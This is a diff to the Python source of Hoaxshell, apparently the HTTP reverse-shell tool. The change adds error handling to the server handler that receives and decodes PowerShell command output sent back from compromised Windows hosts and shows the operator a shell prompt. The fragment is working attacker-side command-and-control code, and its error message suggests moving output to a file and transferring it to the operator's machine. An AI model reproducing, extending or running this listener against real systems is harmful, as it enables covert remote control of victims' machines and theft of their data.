@@ -312,41 +312,45 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		# cmd output
 		if self.path == f'/{Hoaxshell.post_res}' and legit and Hoaxshell.execution_verified:
 
-			self.send_response(200)
-			self.send_header('Access-Control-Allow-Origin', '*')
-			self.send_header('Content-Type', 'text/plain')
-			self.end_headers()
-			self.wfile.write(b'OK')
-			script = self.headers.get('X-form-script')
-			content_len = int(self.headers.get('Content-Length'))
-			output = self.rfile.read(content_len)
+			try:
+				self.send_response(200)
+				self.send_header('Access-Control-Allow-Origin', '*')
+				self.send_header('Content-Type', 'text/plain')
+				self.end_headers()
+				self.wfile.write(b'OK')
+				script = self.headers.get('X-form-script')
+				content_len = int(self.headers.get('Content-Length'))
+				output = self.rfile.read(content_len)
 
-			if output:
-				try:
-					bin_output = output.decode('utf-8').split(' ')
-					to_b_numbers = [ int(n) for n in bin_output ]
-					b_array = bytearray(to_b_numbers)
-					output = b_array.decode('utf-8', 'ignore')
-					tmp = output.rsplit("Path", 1)
-					output = tmp[0]
-					p = tmp[-1].strip().rsplit("\n")[-1]
-					p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
-					junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
-					output = output.rsplit("Drive", 1)[0] if junk else output
-					prompt = f"PS {p} > "
+				if output:
+					try:
+						bin_output = output.decode('utf-8').split(' ')
+						to_b_numbers = [ int(n) for n in bin_output ]
+						b_array = bytearray(to_b_numbers)
+						output = b_array.decode('utf-8', 'ignore')
+						tmp = output.rsplit("Path", 1)
+						output = tmp[0]
+						p = tmp[-1].strip().rsplit("\n")[-1]
+						p = p.replace(":", "", 1).strip() if p.count(":") > 1 else p
+						junk = True if re.search("Provider     : Microsoft.PowerShell.Core", output) else False
+						output = output.rsplit("Drive", 1)[0] if junk else output
+						prompt = f"PS {p} > "
 
-				except UnicodeDecodeError:
-					print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')
+					except UnicodeDecodeError:
+						print(f'[{WARN}] Decoding data to UTF-8 failed. Printing raw data.')
 
-				if isinstance(output, bytes):
-					pass
+					if isinstance(output, bytes):
+						pass
 
+					else:
+						output = output.strip() + '\n' if output.strip() != '' else output.strip()
+
+					print(f'\r{GREEN}{output}{END}')
 				else:
-					output = output.strip() + '\n' if output.strip() != '' else output.strip()
-
-				print(f'\r{GREEN}{output}{END}')
-			else:
-				print(f'\r{ORANGE}No output.{END}')
+					print(f'\r{ORANGE}No output.{END}')
+					
+			except ConnectionResetError:
+				print(f'[{FAILED}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try redirecting the command\'s output to a file and transfering it to your machine.')
 
 			rst_prompt(prompt = prompt)
 			Hoaxshell.prompt_ready = True
